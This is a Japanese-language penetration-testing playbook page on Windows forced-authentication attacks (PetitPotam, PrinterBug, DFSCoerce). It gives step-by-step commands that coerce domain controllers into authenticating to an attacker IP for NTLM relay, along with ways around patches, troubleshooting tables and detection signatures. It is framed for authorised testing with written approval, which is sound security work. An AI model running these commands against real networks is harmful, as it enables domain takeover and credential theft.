# Coerce 系 — PetitPotam / PrinterBug / DFSCoerce（強制認証）

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 業務停止リスク（DC への DCE/RPC 呼び出しを直接行う。DC 不安定環境では一時的な影響が出る可能性がある）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM/EDR で確実に検知される（MDI「Suspected DCE/RPC Exploitation Attempt」/ Event ID 5156・4768）
>
> 実施可否は事前合意で明示確認すること。**DC に対して直接 RPC 呼び出しを行うため、DC$ 認証の強制は書面承認を要する。**
> 演習環境では制約なし。

---

## 着火条件

「Relay 先は用意できているが、被害者ホストから認証が自発的に来ない」状況で使う：

- LLMNR / NBT-NS が GPO で無効化されており、Responder でハッシュが来ない
- ntlmrelayx を構えているが、Relay できる認証フローが発生していない
- ESC8 リレーで DC$ の認証が必要（DC 自身に自分の証明書を AD CS へ提出させる）
- LDAPS Shadow Credentials / RBCD で特定マシンアカウントの認証が必要

**攻撃者の思考トレース：** ポイズニング系（Responder）は「被害者が存在しないホスト名を解決しようとする」という受動的なトリガーに依存する。GPO で LLMNR が無効化されると一切来ない。Coerce 系はターゲットホストの DCE/RPC サービスを直接呼び出し、「攻撃者 IP へ認証しに来い」と強制する。DC を含む Windows ホストが持つ MS-EFSRPC / MS-RPRN / MS-DFSNM インターフェースの仕様上の挙動を悪用している。

---

## 環境前提

- **実行環境**: テスター端末（ターゲットホストと IP 到達性があること）
- **必要なツール**:
  - PetitPotam（`impacket-petitpotam` / `PetitPotam.py`）: Impacket 付属（ペネトレ用 Linux ディストリ標準搭載）。スタンドアロン版は GitHub `topotam/PetitPotam`
  - printerbug（`impacket-printerbug` / `printerbug.py`）: Impacket 付属（ペネトレ用 Linux ディストリ標準搭載）。スタンドアロン版は GitHub `dirkjanm/krbrelayx` に同梱
  - dfscoerce（`dfscoerce.py`）: スタンドアロン版のみ（GitHub: `ly4k/DFSCoerce`）。別途インストール要
- **必要な権限**: テスター端末上での通常ユーザー権限で可（root 不要。ただし ntlmrelayx 起動側は root が必要）
- **オフライン代替**: Impacket 付属の `petitpotam.py` / `printerbug.py` はオフラインで利用可能。`dfscoerce.py` は事前に対象環境外で取得して転送しておく

---

## 3手法の比較と使い分け

| 手法 | 悪用プロトコル | 有効な対象 | 無効化条件 | 優先度 |
|------|------------|---------|---------|------|
| PetitPotam | MS-EFSRPC（EFS RPC） | DC を含むほぼ全 Windows ホスト（未パッチ）| MS-EFSRPC 無効化パッチ（KB5005413 相当）適用済み かつ認証情報なし | 第1選択（匿名実行可能） |
| PrinterBug | MS-RPRN（Spooler RPC） | Print Spooler サービスが稼働しているホスト | Print Spooler サービス停止（DC では無効化が推奨・普及しつつある） | 第2選択（Spooler 稼働確認が必要） |
| DFSCoerce | MS-DFSNM（DFS Namespace） | DFS 関連サービスが稼働しているホスト | DFS サービス無効化 | 第3選択（Spooler 無効・EFS パッチ済み環境の最終手段） |

### 各手法の特徴

**PetitPotam（MS-EFSRPC）**
- 認証情報なしで呼び出し可能（匿名 DCE/RPC 呼び出し）。ハードルが最も低い
- DC を含む Windows ホスト全般に有効
- KB5005413 相当パッチ以降、匿名呼び出しはブロックされる。ただし有効ドメインユーザーの認証情報があれば引き続き使用可能な場合がある
- `lsarpc` パイプ経由の呼び出しはパッチ後も有効な環境が存在する（`efsrpc` が塞がれていても `lsarpc` で成功することがある）

**PrinterBug（MS-RPRN）**
- Print Spooler サービス（`spooler`）が稼働していることが必須
- DC では 2019 以降のベストプラクティスでスプーラー停止が推奨されており、環境依存が強い
- ドメインユーザーの認証情報が必要（匿名呼び出し不可）
- Unconstrained Delegation 攻撃と組み合わせることもある → `../Delegation_Attacks/Unconstrained.md`

**DFSCoerce（MS-DFSNM）**
- Spooler 無効・EFS パッチ済み環境の第三の選択肢
- ドメインユーザーの認証情報が必要
- DFS Namespace 管理サービス（`Dfs`）が稼働していることが条件

---

## 観点・着眼点

### 先に確認すること：対象ホストの稼働サービス

Coerce を試みる前に、対象ホスト（特に DC）で各手法の前提サービスが稼働しているか確認する。

```bash
# [Attacker] nxc（NetExec）でスプーラーサービスの稼働を確認
# nxc: NetExec の CLI ラッパー。ペネトレ用 Linux ディストリ標準搭載
nxc smb [TARGET_IP] -u [USER] -p [PASSWORD] -M spooler
# → "SPOOLER" が "enabled" と表示されれば PrinterBug が使える
```

```bash
# [Attacker] rpcclient で MS-RPRN 呼び出し可否の事前確認
rpcclient -U "[DOMAIN]/[USER]%[PASSWORD]" [TARGET_IP] -c "enumdrivers"
# → エラーなく返ってくれば Spooler が有効
# → "NT_STATUS_ACCESS_DENIED" または接続失敗 → Spooler が無効
```

### 何が出たら次に何をするか

| シグナル | 判断・次のアクション |
|---------|------------------|
| ntlmrelayx 側に `Incoming connection` が表示される | Coerce 成功。リレー先で設定した操作（Shadow Credentials / ESC8 等）が進む |
| `rpc_s_access_denied` または `STATUS_ACCESS_DENIED` | 対象インターフェースが無効化・パッチ済み。別手法へ移行 |
| 接続はするが ntlmrelayx に何も来ない | Coerce 呼び出しに指定した `[ATTACKER_IP]` と ntlmrelayx のリッスン IP が不一致の可能性。`ip a` で再確認 |
| `SpoolSS` 関連エラー | Spooler サービスが停止している。DFSCoerce または PetitPotam へ移行 |
| MDI アラートが上がった | 検知を前提に継続するかスコープ外とするかを対象組織と合意する |

---

## 手順

### 事前準備（必須）：ntlmrelayx を先に起動する

Coerce は「認証フローを強制発生させる」だけであり、その認証を受け取って処理するのは ntlmrelayx の役割。
**ntlmrelayx を先に起動してから各 Coerce コマンドを実行すること。**
ntlmrelayx の起動方法 → `ntlmrelayx.md`（目的に応じて LDAPS / HTTP / SMB を選択）

---

### Step 1: PetitPotam（MS-EFSRPC）

```bash
# [Attacker] 認証情報なし（匿名）で実行 — パッチ未適用環境向け
impacket-petitpotam [ATTACKER_IP] [TARGET_IP]
```

```bash
# [Attacker] ドメインユーザー認証情報付きで実行 — パッチ適用後も有効な場合がある
impacket-petitpotam -u [USER] -p [PASSWORD] -d [DOMAIN] [ATTACKER_IP] [TARGET_IP]
```

- `[ATTACKER_IP]`: ntlmrelayx が動いているテスター端末の IP（ターゲットから到達可能なインターフェース。`ip a` で確認）
- `[TARGET_IP]`: 認証を強制させたいホスト（DC の場合が多い）
- 成功すると ntlmrelayx 側に `Incoming connection` が表示される

`efsrpc` パイプが塞がれている場合は `lsarpc` に切り替える：

```bash
# [Attacker] パイプを明示して試行（Impacket の対応バージョン確認が必要）
impacket-petitpotam -pipe lsarpc [ATTACKER_IP] [TARGET_IP]
```

---

### Step 2: PrinterBug（MS-RPRN）

事前確認でスプーラーが有効なことを確認してから実行する。

```bash
# [Attacker] ドメインユーザー認証情報を使ってスプーラーに強制接続させる
impacket-printerbug -u [USER] -p [PASSWORD] -d [DOMAIN] [TARGET_IP] [ATTACKER_IP]
```

- 成功すると ntlmrelayx 側に DC$ または対象ホストの認証が届く

スタンドアロン版を使用する場合：

```bash
# [Attacker] krbrelayx 内の printerbug.py を使用する場合
python3 printerbug.py [DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP] [ATTACKER_IP]
```

---

### Step 3: DFSCoerce（MS-DFSNM）

PetitPotam が無効化・PrinterBug が使えない環境での第三の選択肢。スタンドアロン版のみのため事前に取得が必要。

事前準備（必須）：`dfscoerce.py` をテスター端末に転送しておく（GitHub: `ly4k/DFSCoerce`）

```bash
# [Attacker] DFSCoerce を実行
python3 dfscoerce.py -u [USER] -p [PASSWORD] -d [DOMAIN] [ATTACKER_IP] [TARGET_IP]
```

---

## 刺さらなかったとき

| 状況 | 対処 |
|------|------|
| PetitPotam が `rpc_s_access_denied` | MS-EFSRPC 無効化パッチ（KB5005413 相当）が適用済み。認証情報付きで再試行、`-pipe lsarpc` に切り替え、または PrinterBug / DFSCoerce へ移行 |
| PrinterBug が接続拒否または失敗 | Spooler サービスが DC で停止している（現代の DC ではベストプラクティス）。DFSCoerce または PetitPotam へ移行 |
| DFSCoerce も失敗 | DFS サービスが無効化されている。3手法すべてが塞がれた場合は Relay の起点を mitm6（IPv6 DNS スプーフィング）へ切り替える → `mitm6.md` |
| ntlmrelayx に認証が来るがリレーが失敗する | Relay 先の署名設定（SMB Signing / LDAP Channel Binding）を確認 → `ntlmrelayx.md` の「先に確認すること」参照 |
| 認証は届くがドメインユーザー権限のみ（DC$ でない） | Coerce 対象が DC でない可能性。`nltest /dclist:[DOMAIN]` または `nxc smb [TARGET_SUBNET]/[PREFIX]` で DC の IP を確認してから再実行 |

---

## 注意点・落とし穴

- **Coerce は起点。成果を生むのは ntlmrelayx 側の設定**：PetitPotam / PrinterBug / DFSCoerce 自体はハッシュも権限も取得しない。ntlmrelayx がどのプロトコルをどのターゲットへリレーするかが成否を決める
- **`[ATTACKER_IP]` はテスター端末の到達可能 IP を指定**：`ip a` で対象セグメント向けのインターフェース IP を確認する。ntlmrelayx がリッスンしている IP と一致させること（環境によって物理 LAN・VPN・専用線など異なる）
- **DC への RPC 呼び出しは MDI がほぼ確実に検知する**：PetitPotam は MDI「Suspected DCE/RPC Exploitation Attempt」として記録される。本番では検知前提で書面合意を取っておく
- **PetitPotam はパッチ後も `lsarpc` パイプ経由で動作する環境が残っている**：`efsrpc` が塞がれていても `lsarpc` で成功することがある。両方試してから諦める
- **PrinterBug は Unconstrained Delegation 攻撃でも使われる**：DC が Unconstrained Delegation 対象の場合に DC$ の TGT をメモリに書き込ませる手法（`../Delegation_Attacks/Unconstrained.md`）。同じコマンドが両方のシナリオで登場する
- **Coerce は設定変更を行わないため原状回復項目なし**：組み合わせた ntlmrelayx 側（Shadow Credentials / RBCD / マシンアカウント）の削除は `ntlmrelayx.md` を参照

---

## 検知される挙動

| 観点 | 検知シグネチャ |
|------|-------------|
| Microsoft Defender for Identity (MDI) | 「Suspected DCE/RPC Exploitation Attempt」アラート（PetitPotam / DFSCoerce）、「Remote code execution attempt」（Spooler 系）|
| Windows イベントログ（ターゲット DC） | Event ID 5156（フィルタリングプラットフォーム許可接続）/ Event ID 4768（Kerberos TGT 要求）/ Event ID 4624 Type 3（NTLM 認証） |
| ネットワーク NDR | テスター IP から DC の 445 / 135 / 動的 RPC ポートへの接続直後に、DC からテスター IP への認証コールバック（アウトバウンド SMB 445 / HTTP 80 / LDAP 389 等） |
| Sysmon（ターゲット） | Event ID 3（ネットワーク接続）— DC から攻撃者 IP への不審なアウトバウンド接続 |

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。DC への直接 RPC 呼び出しを伴い、MDI で即アラートが上がる
- **想定されるSIEM/EDR検知**: MDI「Suspected DCE/RPC Exploitation Attempt」/ Event ID 5156・4768・4624 / ネットワーク NDR（DC からのアウトバウンド認証コールバック）
- **業務影響リスク**: DC への RPC 呼び出しは通常の業務トラフィックには影響しないが、不安定な DC（高負荷・未パッチ環境）では予期しない影響が出る可能性がある。業務時間外の実施を推奨する
- **原状回復必須項目**: Coerce 自体は設定変更を行わないため削除項目なし。組み合わせる ntlmrelayx 側の操作（Shadow Credentials / RBCD / マシンアカウント作成）の原状回復は `ntlmrelayx.md` を参照
- **取得情報の取扱**: Coerce 経由で取得した認証情報・証明書・ハッシュは暗号化保管、テスト完了後破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：LLMNR / NBT-NS ポイズニングが GPO で無効化されている状況の確認 → `./Responder.md`
- 前：Relay 先の署名・チャネルバインディング設定の確認 → `./ntlmrelayx.md`
- 後：リレー先への LDAPS Shadow Credentials 付与 → `./ntlmrelayx.md`（Step 3）
- 後：リレー先への ESC8 証明書取得 → `./ntlmrelayx.md`（Step 5）
- 後：リレー先への RBCD 設定 → `./ntlmrelayx.md`（Step 4）/ `../Delegation_Attacks/RBCD.md`
- 後：3手法すべて無効の場合の代替認証強制 → `./mitm6.md`
- 関連（Unconstrained Delegation との連携）：`../Delegation_Attacks/Unconstrained.md`
